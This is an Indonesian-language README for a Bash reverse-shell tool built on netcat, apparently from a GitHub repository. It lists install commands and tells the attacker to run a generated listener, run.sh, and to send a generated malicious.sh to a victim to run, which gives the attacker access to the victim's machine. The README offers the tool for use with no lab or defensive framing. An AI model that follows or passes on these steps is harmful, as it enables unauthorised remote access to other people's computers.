Program Bash sederhana yang dibuat untuk melakukan reverse shell melalui koneksi TCP menggunakan netcat.

## Instalasi 

```
apt-get update
apt-get install netcat
apt-get install bindutils
apt-get install git
git clone https://github.com/fixploit03/reverse-shell-tcp/
cd reverse-shell-tcp
chmod +x reverse-shell-tcp.sh
./reverse-shell-tcp.sh
```

## Cara menggunakan

**Penyerang (Attacker)**

```
./run.sh
```

**Korban (Victim)**

```
chmod +x malicious.sh
./malicious.sh
```

Jalankan script `reverse-shell-tcp.sh` di mesin penyerang untuk menghasilkan dua file: `run.sh` **(untuk mendengarkan koneksi)** dan `malicious.sh` **(untuk korban)**. Jalankan `run.sh` di mesin penyerang, kemudian kirim dan jalankan `malicious.sh` di mesin korban. Koneksi reverse shell akan terbuka, memberi akses ke mesin korban.

**Selamat mencoba!**
